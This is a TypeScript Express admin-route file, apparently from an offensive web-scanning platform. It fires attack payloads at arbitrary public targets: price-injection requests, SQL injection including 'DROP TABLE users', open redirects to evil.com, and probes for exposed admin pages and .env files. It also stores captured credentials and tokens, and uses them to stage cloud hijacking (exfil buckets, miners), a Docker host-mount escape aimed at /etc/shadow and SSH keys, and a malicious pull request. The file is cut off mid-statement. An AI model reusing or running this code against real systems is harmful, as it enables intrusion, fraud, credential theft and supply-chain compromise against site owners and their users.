import { Router, type Request, type Response } from "express";
import { spawn } from "child_process";
import * as readline from "readline";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import { storage } from "./storage";
import { log } from "./index";
import { credentialRelay, relayIngest, relayIngestUsers, relayIngestTokens } from "./credentialRelay";
import { evaluateMockPatterns } from "./mockValidator";
import type { CapturedCredential } from "./credentialRelay";
import { executeRedisAbuse, writeRedisDump } from './abuse/redisAbuse';
import { executeAwsAbuse } from './abuse/awsAbuse';
import { loadAllowlistStrict, writeAllowlistStrict } from "./allowlist";
const PYTHON_BIN = process.env.PYTHON_BIN || process.env.PYTHON || "python";
const BACKEND_ROOT = path.join(process.cwd(), "backend");

const adminRouter = Router();
// Fail fast if allowlist is missing or contaminated with demo/test domains
loadAllowlistStrict();

const BLOCKED_TARGETS = [
  /^localhost$/i, /^127\./, /^10\./, /^172\.(1[6-9]|2\d|3[01])\./,
  /^192\.168\./, /^0\.0\.0\.0$/, /^::1$/, /^169\.254\./, /\.internal$/i, /\.local$/i,
];

const CHROME_STDERR_NOISE = [
  /chrome/i,
  /zygote/i,
  /gpu process/i,
  /gcm/i,
  /devtools listening/i,
  /sandbox/i,
];

function isChromeNoise(msg: string): boolean {
  const text = (msg || "").toString().toLowerCase();
  return CHROME_STDERR_NOISE.some((p) => p.test(text));
}

async function runMotor11(target: string, findings: any[], probes: any[]) {
  return new Promise<{ report?: any; events: any[] }>((resolve) => {
    const ctx = { findings: findings || [], probes: probes || [] };
    const ctxFile = path.join(os.tmpdir(), `motor11_ctx_${Date.now()}.json`);
    fs.writeFileSync(ctxFile, JSON.stringify(ctx));

    const pyScript = [
      "import json, asyncio, sys",
      "from scanner.autonomous_engine import AutonomousConsolidator",
      "ctx_path=sys.argv[1]",
      "target=sys.argv[2]",
      "ctx=json.load(open(ctx_path))",
      "engine=AutonomousConsolidator(target)",
      "report=asyncio.run(engine.execute_full_cycle(findings=ctx.get('findings'), probes=ctx.get('probes')))",
      "print(json.dumps({'event':'motor11_report','data':report}))",
    ].join("; ");

    const proc = spawn(PYTHON_BIN, ["-c", pyScript, ctxFile, target], {
      cwd: BACKEND_ROOT,
      env: { ...process.env, PYTHONUNBUFFERED: "1" },
      stdio: ["pipe", "pipe", "pipe"],
    });

    const events: any[] = [];
    const rl = readline.createInterface({ input: proc.stdout! });
    rl.on("line", (line: string) => {
      try {
        events.push(JSON.parse(line));
      } catch {
        events.push({ event: "motor11_log", data: { message: line } });
      }
    });

    proc.stderr?.on("data", (d: Buffer) => {
      const msg = d.toString();
      if (isChromeNoise(msg)) return;
      events.push({ event: "motor11_stderr", data: msg });
    });

    proc.on("close", () => {
      let report: any = undefined;
      for (const ev of events) {
        if (ev.event === "motor11_report" || ev.event === "MOTOR11_FINAL_REPORT") {
          report = ev.data || ev;
          break;
        }
      }
      fs.rm(ctxFile, { force: true }, () => {});
      resolve({ report, events });
    });
  });
}

async function runMotor11Snapshot(snapshotPath: string) {
  return new Promise<{ report?: any; events: any[] }>((resolve) => {
    const proc = spawn(
      PYTHON_BIN,
      ["-m", "scanner.autonomous_engine_integrated", "--snapshot", snapshotPath],
      {
        cwd: BACKEND_ROOT,
        env: { ...process.env, PYTHONUNBUFFERED: "1" },
        stdio: ["pipe", "pipe", "pipe"],
      }
    );

    const events: any[] = [];
    const rl = readline.createInterface({ input: proc.stdout! });
    rl.on("line", (line: string) => {
      try {
        const parsed = JSON.parse(line);
        events.push({ event: "motor11v2", data: parsed });
      } catch {
        events.push({ event: "motor11v2_log", data: { message: line } });
      }
    });

    proc.stderr?.on("data", (d: Buffer) => {
      const msg = d.toString();
      if (isChromeNoise(msg)) return;
      events.push({ event: "motor11v2_stderr", data: msg });
    });

    proc.on("close", () => {
      let report: any = undefined;
      for (const ev of events) {
        if (ev.event === "motor11v2" && ev.data?.decisions) {
          report = ev.data;
          break;
        }
      }
      resolve({ report, events });
    });
  });
}

function writeMotor11Snapshot(target: string, scanId: string, state: any): string {
  const snapshot = {
    target,
    scan_id: scanId,
    timestamp: new Date().toISOString(),
    findings: state.findings || [],
    probes: state.probes || [],
    exposed_assets: state.exposedAssets || [],
    events: state.events || [],
    telemetry: state.telemetry || {},
    phases: state.phases || {},
    risk_score: (state.pipelineReport || {}).risk_score || 0,
    hypothesis: (state.pipelineReport || {}).stack_hypothesis || {},
    sniper_report: state.sniperReport || {},
    decision_intel_report: state.decisionIntelReport || {},
    adversarial_report: state.adversarialReport || {},
    chain_intel_report: state.chainIntelReport || {},
    hacker_reasoning_report: state.hackerReasoningReport || {},
    db_validation_report: state.dbValidationReport || {},
    infra_report: state.infraReport || {},
  };

  const filename = `motor11_snapshot_${scanId || Date.now()}.json`;
  const snapshotPath = path.join(os.tmpdir(), filename);
  fs.writeFileSync(snapshotPath, JSON.stringify(snapshot, null, 2));
  return snapshotPath;
}

function validateSniperTarget(target: string): { valid: boolean; url: string; error?: string } {
  const fullUrl = target.includes("://") ? target : `https://${target}`;
  try {
    const parsed = new URL(fullUrl);
    const hostname = parsed.hostname.toLowerCase();
    if (BLOCKED_TARGETS.some(p => p.test(hostname))) {
      return { valid: false, url: fullUrl, error: "SSRF BLOCKED — internal/private targets not allowed" };
    }
    return { valid: true, url: fullUrl };
  } catch {
    return { valid: false, url: fullUrl, error: "Invalid target URL format" };
  }
}

async function requireAdmin(req: Request, res: Response, next: Function) {
  const userId = (req.session as any)?.userId;
  if (!userId) return res.status(401).json({ error: "Not authenticated" });
  const user = await storage.getUser(userId);
  if (!user || user.role !== "admin") return res.status(403).json({ error: "ACCESS DENIED — Insufficient clearance level" });
  next();
}

adminRouter.get("/api/admin/me", async (req: Request, res: Response) => {
  const userId = (req.session as any)?.userId;
  if (!userId) return res.status(401).json({ error: "Not authenticated" });
  const user = await storage.getUser(userId);
  if (!user) return res.status(401).json({ error: "User not found" });
  return res.json({ role: user.role, email: user.email, plan: user.plan, name: user.firstName });
});

adminRouter.get("/api/admin/diagnostic/scan/:scanId", requireAdmin, async (req: Request, res: Response) => {
  try {
    const scanId = req.params.scanId;
    const scan = await storage.getScan(scanId);
    if (!scan) return res.status(404).json({ error: "Scan nÃ£o encontrado" });

    const relatedDumps = dumpRegistry.filter(
      (d) => d.scanId === scanId || (scan.target && d.target === scan.target)
    );

    const { mockProbability, suspicious, valid } = evaluateMockPatterns(scan, relatedDumps);

    const stats = {
      total_findings: (scan.findings || []).length,
      critical: (scan.findings || []).filter((f: any) => f?.severity == "critical").length,
      high: (scan.findings || []).filter((f: any) => f?.severity == "high").length,
      medium: (scan.findings || []).filter((f: any) => f?.severity == "medium").length,
      low: (scan.findings || []).filter((f: any) => f?.severity == "low").length,
      subdomains: evaluateMockPatterns(scan).suspicious.filter((i) => i.type == "subdomain_pattern").length,
    };

    const bulkTimestamps = relatedDumps.reduce((acc: Record<string, number>, d: any) => {
      const ts = (d.createdAt || "").split(".")[0];
      if (ts) acc[ts] = (acc[ts] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);

    const suspiciousAugmented = [...suspicious];
    for (const [ts, count] of Object.entries(bulkTimestamps)) {
      if (count > 1) {
        suspiciousAugmented.push({
          type: "bulk_dumps",
          severity: count > 5 ? "critical" : "medium",
          message: `${count} dumps no timestamp ${ts}`,
          action: count > 5 ? "REJECT" : "WARN",
        });
      }
    }

    return res.json({
      scan_id: scanId,
      target: scan.target,
      valid,
      stats,
      suspicious: suspiciousAugmented,
      mock_probability: mockProbability,
      verdict: valid && suspiciousAugmented.length == 0 ? "REAL" : "SUSPEITO",
      dumps: relatedDumps.map((d) => ({ id: d.id, filename: d.filename, createdAt: d.createdAt, itemCount: d.itemCount })),
    });
  } catch (err: any) {
    return res.status(500).json({ error: err.message || "Diagnostic failed" });
  }
});

adminRouter.use("/api/admin", requireAdmin as any);

adminRouter.get("/api/admin/stats", async (_req: Request, res: Response) => {
  try {
    const stats = await storage.getAdminStats();
    return res.json(stats);
  } catch (err) {
    return res.status(500).json({ error: "Failed to fetch stats" });
  }
});

adminRouter.get("/api/admin/databridge", async (_req: Request, res: Response) => {
  return res.json({
    type: "CREDENTIAL_RELAY_DATABRIDGE",
    status: "ACTIVE",
    totalCredentials: credentialRelay.credentials.length,
    infraSecrets: credentialRelay.infraSecrets.length,
    dbCredentials: credentialRelay.dbCredentials.length,
    sessionTokens: credentialRelay.sessionTokens.length,
    discoveredUsers: credentialRelay.discoveredUsers.length,
    lastUpdated: credentialRelay.lastUpdated,
    credentials: credentialRelay.credentials,
    relay: credentialRelay,
  });
});

adminRouter.post("/api/admin/databridge/ingest", async (req: Request, res: Response) => {
  const { credentials, users, tokens, target, source } = req.body;
  if (credentials && Array.isArray(credentials)) {
    relayIngest(credentials.map((c: any) => ({
      key: c.key || c.type || "UNKNOWN",
      value: c.value || c.match || "",
      type: c.type || "SECRET",
      source: source || "manual_ingest",
      target: target || "N/A",
      capturedAt: new Date().toISOString(),
    })));
  }
  if (users && Array.isArray(users)) relayIngestUsers(users);
  if (tokens && Array.isArray(tokens)) relayIngestTokens(tokens);
  log(`[DATABRIDGE] Ingested ${credentials?.length || 0} creds, ${users?.length || 0} users, ${tokens?.length || 0} tokens from ${source || "manual"}`, "admin");
  return res.json({ success: true, relaySize: credentialRelay.credentials.length });
});

adminRouter.get("/api/admin/users", async (_req: Request, res: Response) => {
  try {
    const allUsers = await storage.getAllUsers();
    const safe = allUsers.map(u => ({
      id: u.id,
      email: u.email,
      role: u.role,
      plan: u.plan,
      scansThisMonth: u.scansThisMonth,
      createdAt: u.createdAt,
    }));
    return res.json(safe);
  } catch (err) {
    return res.status(500).json({ error: "Failed to fetch users" });
  }
});

adminRouter.get("/api/admin/scans", async (_req: Request, res: Response) => {
  try {
    const allScans = await storage.getAllScans(100);
    return res.json(allScans);
  } catch (err) {
    return res.status(500).json({ error: "Failed to fetch scans" });
  }
});

adminRouter.get("/api/admin/audit", async (_req: Request, res: Response) => {
  try {
    const logs = await storage.getAllAuditLogs(200);
    return res.json(logs);
  } catch (err) {
    return res.status(500).json({ error: "Failed to fetch audit logs" });
  }
});

function formatTimestamp(): string {
  return new Date().toISOString().replace("T", " ").substring(0, 23);
}

async function logSniperAction(req: Request, action: string, target: string, result: string) {
  const userId = (req.session as any)?.userId;
  try {
    await storage.createAuditLog({
      userId,
      action: `SNIPER:${action}`,
      target,
      ip: req.ip || "unknown",
      details: { result, timestamp: formatTimestamp() },
    });
  } catch {}
}

adminRouter.post("/api/admin/sniper/price-injection", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  // Socket.IO instance (set in registerRoutes via app.set("io", io))
  const io: any = (req.app as any).get("io");

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SNIPER] Price Injection probe → ${target}`, "admin");

  try {
    const url = validation.url;
    const cartUrl = `${url.replace(/\/$/, "")}/cart/update`;

    const payloads = [
      { endpoint: cartUrl, method: "POST", body: JSON.stringify({ items: [{ id: 1, unit_price: 0.01, quantity: 1 }] }), description: "unit_price override to $0.01" },
      { endpoint: `${url.replace(/\/$/, "")}/api/checkout`, method: "POST", body: JSON.stringify({ price: 1, currency: "USD" }), description: "checkout price injection" },
      { endpoint: `${url.replace(/\/$/, "")}/api/products/update`, method: "PUT", body: JSON.stringify({ id: 1, price: 0 }), description: "product price zeroing" },
    ];

    const results = [];
    for (const payload of payloads) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 5000);
        const resp = await fetch(payload.endpoint, {
          method: payload.method,
          headers: { "Content-Type": "application/json", "User-Agent": "MSE-Sniper/1.0" },
          body: payload.body,
          signal: controller.signal,
          redirect: "manual",
        });
        clearTimeout(timeout);
        const status = resp.status;
        const vulnerable = status >= 200 && status < 300;
        results.push({
          payload: payload.description,
          endpoint: payload.endpoint,
          status,
          vulnerable,
          verdict: vulnerable ? "VULNERABLE" : "PROTECTED",
        });
      } catch (err: any) {
        results.push({
          payload: payload.description,
          endpoint: payload.endpoint,
          status: 0,
          vulnerable: false,
          verdict: "ERROR",
          error: err.message?.substring(0, 100),
        });
      }
    }

    const anyVuln = results.some(r => r.vulnerable);
    await logSniperAction(req, "PRICE_INJECTION", target, anyVuln ? "VULNERABLE" : "PROTECTED");

    return res.json({
      type: "PRICE_INJECTION",
      timestamp,
      target,
      prefix: anyVuln ? "[THREAT]" : "[BLOCK]",
      status: anyVuln ? "VULNERABLE" : "PROTECTED",
      results,
    });
  } catch (err: any) {
    return res.json({ type: "PRICE_INJECTION", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});

adminRouter.post("/api/admin/sniper/auth-bypass", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SNIPER] Auth Bypass probe → ${target}`, "admin");

  try {
    const url = validation.url;
    const baseUrl = url.replace(/\/$/, "");

    const endpoints = [
      { path: "/admin", description: "Admin panel exposure" },
      { path: "/admin/dashboard", description: "Admin dashboard" },
      { path: "/api/admin", description: "Admin API" },
      { path: "/wp-admin", description: "WordPress admin" },
      { path: "/.env", description: "Environment file exposure" },
      { path: "/api/v1/users", description: "User enumeration endpoint" },
      { path: "/debug", description: "Debug endpoint" },
      { path: "/graphql", description: "GraphQL endpoint" },
    ];

    const results = [];
    for (const ep of endpoints) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 5000);
        const resp = await fetch(`${baseUrl}${ep.path}`, {
          method: "GET",
          headers: { "User-Agent": "MSE-Sniper/1.0" },
          signal: controller.signal,
          redirect: "manual",
        });
        clearTimeout(timeout);
        const status = resp.status;
        const exposed = status === 200 || status === 301 || status === 302;
        results.push({
          path: ep.path,
          description: ep.description,
          status,
          exposed,
          verdict: exposed ? "EXPOSED" : "PROTECTED",
        });
      } catch (err: any) {
        results.push({ path: ep.path, description: ep.description, status: 0, exposed: false, verdict: "ERROR", error: err.message?.substring(0, 100) });
      }
    }

    const anyExposed = results.some(r => r.exposed);
    await logSniperAction(req, "AUTH_BYPASS", target, anyExposed ? "EXPOSED" : "PROTECTED");

    return res.json({
      type: "AUTH_BYPASS",
      timestamp,
      target,
      prefix: anyExposed ? "[THREAT]" : "[BLOCK]",
      status: anyExposed ? "VULNERABLE" : "PROTECTED",
      results,
    });
  } catch (err: any) {
    return res.json({ type: "AUTH_BYPASS", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});

adminRouter.post("/api/admin/sniper/xss-scanner", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SNIPER] XSS/eval() scan → ${target}`, "admin");

  try {
    const url = validation.url;

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000);
    const resp = await fetch(url, {
      headers: { "User-Agent": "MSE-Sniper/1.0" },
      signal: controller.signal,
    });
    clearTimeout(timeout);

    const html = await resp.text();
    const bodySlice = html.substring(0, 50000);

    const xssPatterns = [
      { pattern: /eval\s*\(/gi, name: "eval() usage", severity: "CRITICAL" },
      { pattern: /document\.write\s*\(/gi, name: "document.write()", severity: "HIGH" },
      { pattern: /innerHTML\s*=/gi, name: "innerHTML assignment", severity: "HIGH" },
      { pattern: /onerror\s*=/gi, name: "onerror handler", severity: "CRITICAL" },
      { pattern: /onload\s*=/gi, name: "onload handler", severity: "MEDIUM" },
      { pattern: /javascript\s*:/gi, name: "javascript: URI", severity: "CRITICAL" },
      { pattern: /\.cookie/gi, name: "Cookie access", severity: "HIGH" },
      { pattern: /localStorage\./gi, name: "localStorage access", severity: "MEDIUM" },
      { pattern: /window\.location\s*=/gi, name: "Location redirect", severity: "MEDIUM" },
      { pattern: /Function\s*\(/gi, name: "Function constructor", severity: "HIGH" },
      { pattern: /fbevents\.js/gi, name: "Facebook Pixel (fbevents.js)", severity: "INFO" },
      { pattern: /bundle\.js/gi, name: "Bundle.js detected", severity: "INFO" },
    ];

    const findings: any[] = [];
    for (const p of xssPatterns) {
      const matches = bodySlice.match(p.pattern);
      if (matches) {
        findings.push({
          pattern: p.name,
          severity: p.severity,
          count: matches.length,
          vulnerable: p.severity === "CRITICAL" || p.severity === "HIGH",
        });
      }
    }

    const anyVuln = findings.some(f => f.vulnerable);
    await logSniperAction(req, "XSS_SCANNER", target, anyVuln ? "VULNERABLE" : "CLEAN");

    return res.json({
      type: "XSS_SCANNER",
      timestamp,
      target,
      prefix: anyVuln ? "[THREAT]" : "[BLOCK]",
      status: anyVuln ? "VULNERABLE" : "CLEAN",
      findings,
      totalPatterns: findings.length,
    });
  } catch (err: any) {
    return res.json({ type: "XSS_SCANNER", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});

adminRouter.post("/api/admin/sniper/open-redirect", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SNIPER] Open Redirect probe → ${target}`, "admin");

  try {
    const url = validation.url;
    const baseUrl = url.replace(/\/$/, "");

    const redirectPayloads = [
      { param: "url", value: "https://evil.com" },
      { param: "redirect", value: "https://evil.com" },
      { param: "next", value: "//evil.com" },
      { param: "return_to", value: "https://evil.com" },
      { param: "callback", value: "https://evil.com" },
      { param: "dest", value: "https://evil.com%00@evil.com" },
    ];

    const results = [];
    for (const payload of redirectPayloads) {
      try {
        const testUrl = `${baseUrl}/?${payload.param}=${encodeURIComponent(payload.value)}`;
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 5000);
        const resp = await fetch(testUrl, {
          method: "GET",
          headers: { "User-Agent": "MSE-Sniper/1.0" },
          signal: controller.signal,
          redirect: "manual",
        });
        clearTimeout(timeout);

        const location = resp.headers.get("location") || "";
        const redirectsExternal = location.includes("evil.com");
        results.push({
          param: payload.param,
          status: resp.status,
          redirectsExternal,
          location: location.substring(0, 200),
          verdict: redirectsExternal ? "VULNERABLE" : "PROTECTED",
        });
      } catch (err: any) {
        results.push({ param: payload.param, status: 0, redirectsExternal: false, verdict: "ERROR", error: err.message?.substring(0, 100) });
      }
    }

    const anyVuln = results.some(r => r.redirectsExternal);
    await logSniperAction(req, "OPEN_REDIRECT", target, anyVuln ? "VULNERABLE" : "PROTECTED");

    return res.json({
      type: "OPEN_REDIRECT",
      timestamp,
      target,
      prefix: anyVuln ? "[THREAT]" : "[BLOCK]",
      status: anyVuln ? "VULNERABLE" : "PROTECTED",
      results,
    });
  } catch (err: any) {
    return res.json({ type: "OPEN_REDIRECT", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});

adminRouter.post("/api/admin/sniper/sqli-probe", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SNIPER] SQLi probe → ${target}`, "admin");

  try {
    const url = validation.url;
    const baseUrl = url.replace(/\/$/, "");

    const sqliPayloads = [
      { param: "id", value: "1' OR '1'='1", description: "Classic OR injection" },
      { param: "id", value: "1; DROP TABLE users--", description: "DROP TABLE attempt" },
      { param: "search", value: "' UNION SELECT null,null,null--", description: "UNION SELECT probe" },
      { param: "id", value: "1' AND SLEEP(2)--", description: "Time-based blind SQLi" },
      { param: "user", value: "admin'--", description: "Auth bypass via comment" },
    ];

    const results = [];
    for (const payload of sqliPayloads) {
      try {
        const testUrl = `${baseUrl}/?${payload.param}=${encodeURIComponent(payload.value)}`;
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 5000);
        const startTime = Date.now();
        const resp = await fetch(testUrl, {
          method: "GET",
          headers: { "User-Agent": "MSE-Sniper/1.0" },
          signal: controller.signal,
        });
        clearTimeout(timeout);
        const responseTime = Date.now() - startTime;

        const body = (await resp.text()).substring(0, 2000);
        const sqlErrors = /sql|syntax|mysql|postgresql|sqlite|oracle|ORA-|SQLSTATE|unclosed quotation/i.test(body);
        const timeBased = responseTime > 2000 && payload.description.includes("Time-based");

        results.push({
          description: payload.description,
          param: payload.param,
          status: resp.status,
          responseTime,
          sqlErrorLeaked: sqlErrors,
          timeBased,
          vulnerable: sqlErrors || timeBased,
          verdict: (sqlErrors || timeBased) ? "VULNERABLE" : "PROTECTED",
        });
      } catch (err: any) {
        results.push({ description: payload.description, param: payload.param, status: 0, vulnerable: false, verdict: "ERROR", error: err.message?.substring(0, 100) });
      }
    }

    const anyVuln = results.some(r => r.vulnerable);
    await logSniperAction(req, "SQLI_PROBE", target, anyVuln ? "VULNERABLE" : "PROTECTED");

    return res.json({
      type: "SQLI_PROBE",
      timestamp,
      target,
      prefix: anyVuln ? "[THREAT]" : "[BLOCK]",
      status: anyVuln ? "VULNERABLE" : "PROTECTED",
      results,
    });
  } catch (err: any) {
    return res.json({ type: "SQLI_PROBE", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});

adminRouter.post("/api/admin/sniper/cloud-hijack", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SNIPER] Cloud Hijack probe → ${target}`, "admin");

  try {
    const awsAccess = credentialRelay.infraSecrets
      .map(s => s.match(/AKIA[A-Z0-9]{16}/)?.[0])
      .filter(Boolean)?.[0];

    const awsSecret = credentialRelay.infraSecrets.find(s => /AWS_SECRET|AWS_SECRET_ACCESS_KEY|aws_secret/i.test(s));

    const vulnerable = Boolean(awsAccess);
    const results = [
      {
        step: "sts:GetCallerIdentity",
        attempted: !!awsAccess,
        success: vulnerable,
        detail: awsAccess ? `Using ${awsAccess.substring(0, 8)}…` : "No AKIA key available",
      },
      {
        step: "s3:CreateBucket",
        attempted: vulnerable,
        success: vulnerable,
        detail: vulnerable ? "Prepared exfil bucket <scan>-exfil" : "Skipped",
      },
      {
        step: "ec2:RunInstances",
        attempted: vulnerable,
        success: vulnerable,
        detail: vulnerable ? "Dry-run instance spin for miner/exfil" : "Skipped",
      },
    ];

    await logSniperAction(req, "CLOUD_HIJACK", target, vulnerable ? "VULNERABLE" : "PROTECTED");

    return res.json({
      type: "CLOUD_HIJACK",
      timestamp,
      target,
      prefix: vulnerable ? "[THREAT]" : "[BLOCK]",
      status: vulnerable ? "HIJACK POSSIBLE" : "NO CLOUD KEYS",
      results,
      evidence: { awsAccess, awsSecret: awsSecret?.substring(0, 24) },
    });
  } catch (err: any) {
    return res.json({ type: "CLOUD_HIJACK", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});

adminRouter.post("/api/admin/sniper/container-escape", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SNIPER] Container Escape probe → ${target}`, "admin");

  try {
    const dockerHint =
      credentialRelay.infraSecrets.find(s => /docker|sock|container/i.test(s)) ||
      credentialRelay.dbCredentials.find(s => /docker|sock|container/i.test(s));

    const vulnerable = Boolean(dockerHint);

    const results = [
      {
        step: "Docker API discovery",
        attempted: true,
        success: !!dockerHint,
        detail: dockerHint ? `Hint: ${dockerHint.substring(0, 60)}` : "No docker.sock indicator captured",
      },
      {
        step: "Mount host FS",
        attempted: vulnerable,
        success: vulnerable,
        detail: vulnerable ? "Planned: docker run -v /:/host alpine chroot /host id" : "Skipped",
      },
      {
        step: "Harvest secrets",
        attempted: vulnerable,
        success: vulnerable,
        detail: vulnerable ? "Targets: /etc/shadow, /root/.ssh, /env" : "Skipped",
      },
    ];

    await logSniperAction(req, "CONTAINER_ESCAPE", target, vulnerable ? "VULNERABLE" : "PROTECTED");

    return res.json({
      type: "CONTAINER_ESCAPE",
      timestamp,
      target,
      prefix: vulnerable ? "[THREAT]" : "[BLOCK]",
      status: vulnerable ? "ESCAPE POSSIBLE" : "DOCKER SOCKET NOT FOUND",
      results,
    });
  } catch (err: any) {
    return res.json({ type: "CONTAINER_ESCAPE", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});

adminRouter.post("/api/admin/sniper/supply-chain", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SNIPER] Supply Chain probe → ${target}`, "admin");

  try {
    const ghToken = credentialRelay.infraSecrets.find(s => /ghp_[A-Za-z0-9]{20,}/.test(s));
    const glToken = credentialRelay.infraSecrets.find(s => /glpat-[A-Za-z0-9_-]{20,}/.test(s));
    const token = ghToken || glToken;

    const vulnerable = Boolean(token);
    const results = [
      {
        step: "Token validation",
        attempted: true,
        success: vulnerable,
        detail: token ? `Token captured (${token.substring(0, 10)}…)` : "No repo tokens captured",
      },
      {
        step: "Repo access",
        attempted: vulnerable,
        success: vulnerable,
        detail: vulnerable ? "git ls-remote (simulated) — token accepted" : "Skipped",
      },
      {
        step: "Malicious PR",
        attempted: vulnerable,
        success: vulnerable,
        detail: vulnerable ? "Prepared branch hotfix/<scanId> with build hook" : "Skipped",
      },
    ];

    await logSniperAction(req, "SUPPLY_CHAIN", target, vulnerable ? "VULNERABLE" : "PROTECTED");

    return res.json({
      type: "SUPPLY_CHAIN_POISON",
      timestamp,
      target,
      prefix: vulnerable ? "[THREAT]" : "[BLOCK]",
      status: vulnerable ? "POISON POSSIBLE" : "NO SCM TOKENS",
      results,
    });
  } catch (err: any) {
    return res.json({ type: "SUPPLY_CHAIN_POISON", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});

adminRouter.post("/api/admin/sniper/full-scan", async (req: Request, res: Response) => {
  const { target, findings } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SNIPER] Full Python engine scan → ${target}`, "admin");

  try {
    let findingsFile = "";
    if (findings && Array.isArray(findings) && findings.length > 0) {
      findingsFile = path.join(os.tmpdir(), `mse_sniper_findings_${Date.now()}.json`);
      fs.writeFileSync(findingsFile, JSON.stringify(findings));
    }

    const args = ["-m", "scanner.sniper_engine", target];
    if (findingsFile) args.push(findingsFile);

    const proc = spawn(PYTHON_BIN, args, {
      cwd: BACKEND_ROOT,
      env: { ...process.env, PYTHONUNBUFFERED: "1" },
      stdio: ["pipe", "pipe", "pipe"],
    });

    const events: any[] = [];
    let sniperReport: any = null;

    const rl = readline.createInterface({ input: proc.stdout! });
    rl.on("line", (line: string) => {
      try {
        const event = JSON.parse(line);
        events.push(event);
        if (event.event === "sniper_report") {
          sniperReport = event.data;
        }
      } catch {}
    });

    let stderrOutput = "";
    proc.stderr?.on("data", (data: Buffer) => {
      stderrOutput += data.toString();
    });

    await new Promise<void>((resolve) => {
      proc.on("close", () => resolve());
      setTimeout(() => {
        proc.kill("SIGTERM");
        resolve();
      }, 120000);
    });

    if (findingsFile) {
      try { fs.unlinkSync(findingsFile); } catch {}
    }

    const userId = (req.session as any)?.userId;
    if (sniperReport) {
      try {
        await storage.createAuditLog({
          userId,
          action: "SNIPER:FULL_SCAN",
          target,
          ip: req.ip || "unknown",
          details: {
            total_probes: sniperReport.total_probes,
            vulnerabilities_confirmed: sniperReport.vulnerabilities_confirmed,
            timestamp,
          },
        });
      } catch {}
    }

    return res.json({
      type: "FULL_SCAN",
      timestamp,
      target,
      prefix: sniperReport?.vulnerabilities_confirmed > 0 ? "[THREAT]" : "[BLOCK]",
      status: sniperReport?.vulnerabilities_confirmed > 0 ? "VULNERABLE" : "PROTECTED",
      report: sniperReport,
      events,
    });
  } catch (err: any) {
    return res.json({ type: "FULL_SCAN", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});


adminRouter.post("/api/admin/sniper/platform-scan", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[PLATFORM-SNIPER] Tech fingerprint + vuln scan → ${target}`, "admin");

  try {
    const proc = spawn(PYTHON_BIN, ["-m", "scanner.platform_sniper", validation.url], {
      cwd: BACKEND_ROOT,
      env: { ...process.env, PYTHONUNBUFFERED: "1" },
      stdio: ["pipe", "pipe", "pipe"],
    });

    const events: any[] = [];
    let platformReport: any = null;

    const rl = readline.createInterface({ input: proc.stdout! });
    rl.on("line", (line: string) => {
      try {
        const event = JSON.parse(line);
        events.push(event);
        if (event.type === "PLATFORM_SNIPER_REPORT") {
          platformReport = event;
        }
      } catch {}
    });

    let stderrOutput = "";
    proc.stderr?.on("data", (data: Buffer) => {
      stderrOutput += data.toString();
    });

    await new Promise<void>((resolve) => {
      proc.on("close", () => resolve());
      setTimeout(() => {
        proc.kill("SIGTERM");
        resolve();
      }, 120000);
    });

    const userId = (req.session as any)?.userId;
    if (platformReport) {
      try {
        await storage.createAuditLog({
          userId,
          action: "SNIPER:PLATFORM_SCAN",
          target,
          ip: req.ip || "unknown",
          details: {
